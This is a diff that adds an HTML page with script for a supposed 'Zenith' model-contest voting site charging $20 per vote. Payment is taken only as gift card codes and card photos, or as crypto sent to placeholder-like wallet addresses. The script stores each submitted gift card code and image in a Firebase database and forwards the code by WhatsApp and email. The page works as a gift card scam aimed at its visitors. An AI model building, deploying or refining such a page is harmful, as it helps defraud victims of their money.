@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ZENITH - 2026/2027 SEASON</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Georgia, serif}
+body{background:#0a0a0a;color:#fff;min-height:100vh}
+.top{text-align:center;padding:18px;border-bottom:1px solid #222}
+.top small{letter-spacing:3px;color:#888;font-size:11px}
+h1.main{font-size:32px;letter-spacing:4px;font-weight:300;text-align:center;margin:30px 0 5px}
+p.sub{font-size:10px;letter-spacing:2px;color:#888;text-align:center;margin-bottom:30px}
+.code-box{max-width:400px;margin:0 auto;padding:20px;border:1px solid #222;background:#111}
+.code-box input{width:100%;padding:14px;background:#000;border:1px solid #333;color:#fff;letter-spacing:1px;margin-bottom:10px;text-align:center}
+.btn-gold{background:#c9a86a;color:#000;border:none;width:100%;padding:13px;letter-spacing:2px;font-weight:600;cursor:pointer}
+.msg{font-size:11px;color:#888;text-align:center;margin-top:10px;letter-spacing:1px}
+.result{max-width:450px;margin:20px auto;background:#111;border:1px solid #222}
+.result img{width:100%;height:500px;object-fit:cover}
+.result-body{text-align:center;padding:20px}
+.result-body h2{letter-spacing:2px;font-size:20px}
+.result-body small{color:#c9a86a;border:1px solid #333;padding:3px 8px;font-size:10px;display:inline-block;margin:10px 0}
+.result-body .votes{font-size:11px;color:#888;margin:5px}
+.footer{font-size:9px;color:#555;text-align:center;padding:20px;letter-spacing:1px;line-height:1.8}
+.footer a{color:#c9a86a;text-decoration:none}
+.modal{position:fixed;inset:0;background:rgba(0,0,0,0.96);display:none;align-items:center;justify-content:center;z-index:99;padding:15px;overflow:auto}
+.modal.show{display:flex}
+.modal-box{background:#111;border:1px solid #333;width:100%;max-width:420px;padding:22px}
+.modal-box h3{text-align:center;letter-spacing:2px;font-size:18px;margin-bottom:15px}
+.modal-box input, .modal-box select{width:100%;padding:12px;background:#000;border:1px solid #333;color:#fff;margin:6px 0;font-family:Arial;font-size:13px}
+.modal-box label{font-size:10px;color:#888;letter-spacing:1px;margin-top:8px;display:block;font-family:Arial}
+.total{font-family:Arial;text-align:center;padding:10px;background:#0a0a0a;border:1px dashed #c9a86a;margin:10px 0;font-size:13px}
+.wallet-box{background:#000;border:1px solid #333;padding:10px;margin:8px 0;font-size:11px;font-family:Arial;word-break:break-all}
+.wallet-box b{color:#c9a86a}
+.tabs-pay{display:flex;gap:8px;margin:10px 0}
+.tabs-pay div{flex:1;padding:10px;text-align:center;border:1px solid #333;cursor:pointer;font-size:11px;font-family:Arial}
+.tabs-pay div.active{background:#c9a86a;color:#000;font-weight:700}
+</style>
+</head>
+<body>
+<div class="top"><small>ZENITH <span style="border:1px solid #333;padding:2px 6px">2026 / 2027 SEASON</span></small></div>
+<h1 class="main">MODEL<br>CONTEST<br>2026/2027</h1>
+<p class="sub">PRIVATE VOTING - THE FACE OF ZENITH</p>
+<div class="code-box" id="searchBox">
+<p style="text-align:center;letter-spacing:2px;margin-bottom:15px;font-size:14px">ENTER CONTESTANT CODE</p>
+<input id="codeInput" placeholder="Saya463">
+<button class="btn-gold" onclick="searchCode()">SEARCH</button>
+<p class="msg" id="searchMsg"></p>
+</div>
+<div class="result" id="resultBox" style="display:none">
+<img id="resImg" src="">
+<div class="result-body">
+<h2 id="resName"></h2>
+<small id="resCode"></small>
+<div style="font-size:11px;color:#888;margin-top:5px" id="resDesc"></div>
+<div class="votes" id="resVotes"></div>
+<button class="btn-gold" style="margin-top:15px" onclick="openVote()">VOTE FOR <span id="voteName"></span></button>
+</div>
+</div>
+<div class="footer">
+© 2026/2027 ZENITH • CONCIERGE: <a href="mailto:Zenithmodeling1@outlook.com">Zenithmodeling1@outlook.com</a><br>
+PRIVATE VOTING • SECURE • VERIFIED<br>
+<span style="color:#777">For confirmation or support after payment, email us.</span>
+</div>
+<div class="modal" id="voteModal">
+<div class="modal-box">
+<h3 id="modalTitle">VOTE</h3>
+<input id="voterEmail" placeholder="YOUR EMAIL" type="email">
+<input id="qty" type="number" min="1" value="1" oninput="calcTotal()">
+<div class="total">TOTAL: $<span id="total">20</span> ($20 per vote)</div>
+<div class="tabs-pay">
+<div id="tabGift" class="active" onclick="setPay('gift')">GIFT CARD</div>
+<div id="tabCrypto" onclick="setPay('crypto')">WALLET ADDRESS</div>
+</div>
+<div id="payGift">
+<label>Gift Card Type (No Amount Required)</label>
+<select id="giftType">
+<option value="">Select Type</option>
+<option>Amazon</option><option>Apple / iTunes</option><option>Google Play</option><option>Steam</option><option>eBay</option><option>Vanilla</option><option>Razor Gold</option><option>Sephora</option><option>Other</option>
+</select>
+<label>Gift Card Code *</label>
+<input id="giftCode" placeholder="Enter code here">
+<label>Upload Gift Card Picture *</label>
+<input id="giftImage" type="file" accept="image/*">
+</div>
+<div id="payCrypto" style="display:none">
+<label>Pay with Wallet Address</label>
+<div class="wallet-box"><b>BTC:</b> bc1qxy2kzenith2026votingxyz</div>
+<div class="wallet-box"><b>USDT (TRC20):</b> TXzenith2026VoteSecure123</div>
+<div class="wallet-box"><b>ETH:</b> 0xZenith2026VoteWallet</div>
+<p style="font-size:10px;color:#888;margin-top:8px">After payment, email receipt to Zenithmodeling1@outlook.com</p>
+<input id="cryptoTxn" placeholder="Transaction ID / Hash (optional)">
+</div>
+<button class="btn-gold" onclick="submitVote()">PAY VIA WHATSAPP & EMAIL</button>
+<button class="btn-gold" style="background:#222;color:#fff;margin-top:8px" onclick="closeVote()">CANCEL</button>
+<p style="font-size:10px;color:#c9a86a;text-align:center;margin-top:10px">Support: Zenithmodeling1@outlook.com</p>
+<p id="voteStatus" style="font-size:11px;color:#c9a86a;text-align:center;margin-top:8px;font-family:Arial"></p>
+</div>
+</div>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getDatabase, ref, onValue, push } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+const firebaseConfig={apiKey:"AIzaSyCah_ucdI55pyBR_RJ_ILu26aSALI1rVbA",authDomain:"zenith-2026-vote.firebaseapp.com",databaseURL:"https://zenith-2026-vote-default-rtdb.firebaseio.com",projectId:"zenith-2026-vote",storageBucket:"zenith-2026-vote.firebasestorage.app",messagingSenderId:"534661022606",appId:"1:534661022606:web:31af138277cf4e88ce9adf"};
+const app=initializeApp(firebaseConfig); const db=getDatabase(app);
+let models=[]; let current=null; let payMode='gift';
+onValue(ref(db,'models'), snap=>{
+ const data=snap.val(); models=data?Object.entries(data).map(([id,v])=>({id,...v})):[]; 
+});
+window.searchCode=()=>{
+ const code=document.getElementById('codeInput').value.trim().toLowerCase();
+ const msg=document.getElementById('searchMsg'); const box=document.getElementById('resultBox');
+ const found=models.find(m=>(m.code||'').toLowerCase()===code);
+ if(!found){msg.textContent=`CODE "${document.getElementById('codeInput').value}" NOT FOUND. CONTACT CONCIERGE Zenithmodeling1@outlook.com`; box.style.display='none'; return;}
+ msg.textContent=''; current=found; document.getElementById('resImg').src=found.mainImage||found.image; document.getElementById('resName').textContent=found.name.toUpperCase(); document.getElementById('resCode').textContent=found.code; document.getElementById('resDesc').textContent=found.desc||'Runway Contestant'; document.getElementById('resVotes').textContent=`☆ ${found.votes||0} VOTES`; document.getElementById('voteName').textContent=found.name.toUpperCase(); box.style.display='block'; box.scrollIntoView({behavior:'smooth'});
+};
+window.openVote=()=>{if(!current)return; document.getElementById('modalTitle').textContent=`VOTE ${current.name.toUpperCase()}`; document.getElementById('voteModal').classList.add('show'); calcTotal();};
+window.closeVote=()=>document.getElementById('voteModal').classList.remove('show');
+window.calcTotal=()=>{const q=parseInt(document.getElementById('qty').value)||1; document.getElementById('total').textContent=q*20;};
+window.setPay=m=>{payMode=m; document.getElementById('tabGift').classList.toggle('active',m==='gift'); document.getElementById('tabCrypto').classList.toggle('active',m==='crypto'); document.getElementById('payGift').style.display=m==='gift'?'block':'none'; document.getElementById('payCrypto').style.display=m==='crypto'?'block':'none';};
+function toB64(f){return new Promise((r,j)=>{const rd=new FileReader();rd.onload=e=>r(e.target.result);rd.onerror=j;rd.readAsDataURL(f);});}
+window.submitVote=async()=>{
+ const email=document.getElementById('voterEmail').value.trim(); const qty=parseInt(document.getElementById('qty').value)||1; const type=document.getElementById('giftType').value; const code=document.getElementById('giftCode').value.trim(); const file=document.getElementById('giftImage').files[0]; const status=document.getElementById('voteStatus');
+ if(!email){status.textContent='Enter email';return;}
+ let giftImg=''; if(payMode==='gift'){ if(!code){status.textContent='Enter gift card code';return;} if(file) giftImg=await toB64(file); }
+ status.textContent='Processing...';
+ try{
+  const payload={modelId:current.id, modelName:current.name, contestantCode:current.code, voterEmail:email, qty, total:qty*20, perVote:20, payMode, giftType:type, giftCode:code, giftImage:giftImg, cryptoTxn:document.getElementById('cryptoTxn').value, created:Date.now(), status:'pending'};
+  await push(ref(db,'votes'), payload);
+  const waMsg=`Hello Zenith Concierge 2026/2027%0A%0AVote Request:%0A- Model: ${current.name}%0A- Code: ${current.code}%0A- Qty: ${qty} votes%0A- Total: $${qty*20} ($20 per vote)%0A- Email: ${email}%0A- Gift Type: ${type}%0A- Gift Code: ${code}`;
+  status.textContent='✅ Submitted! Opening WhatsApp...';
+  setTimeout(()=>{window.open(`https://wa.me/14794964725?text=${waMsg}`,'_blank'); window.location.href=`mailto:Zenithmodeling1@outlook.com?subject=Zenith Vote Confirmation - ${current.name}&body=${decodeURIComponent(waMsg)}`;},1000);
+ }catch(e){status.textContent='Error: '+e.message}
+};
+</script>
+</body>
+</html>
